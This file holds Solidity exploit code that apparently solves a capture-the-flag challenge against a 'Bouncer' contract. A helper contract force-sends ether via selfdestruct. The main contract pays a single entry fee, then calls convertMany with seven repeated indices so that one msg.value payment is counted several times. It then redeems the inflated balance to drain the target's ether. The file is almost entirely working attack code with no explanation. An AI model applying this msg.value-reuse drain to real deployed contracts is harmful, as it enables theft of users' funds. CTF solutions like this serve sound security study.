pragma solidity ^0.8.0;

import "public/Setup.sol";

contract Sender {
    constructor(address to) payable {
        selfdestruct(payable(to));
    }
}

contract Exploit {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    Setup setup;
    Bouncer bouncer;

    constructor(Setup _setup) payable {
        setup = _setup;

        bouncer = setup.bouncer();

        // pay 1 eth fee to create the entry
        bouncer.enter{value: 1 ether}(ETH, 10 ether);
    }

    function go() public payable {
        // send 7 additional eth to get our entry fee plus the 2 fees sent by the
        // other user
        new Sender{value: 7 ether}(address(bouncer));

        uint256 num = 7;
        uint256[] memory req = new uint256[](num);
        for (uint256 i = 0; i < num; i++) {
            req[i] = 0;
        }
        bouncer.convertMany{value: 10 ether}(address(this), req);
        bouncer.redeem(ERC20Like(ETH), uint256(num * 10 ether));
    }

    receive() external payable {}
}
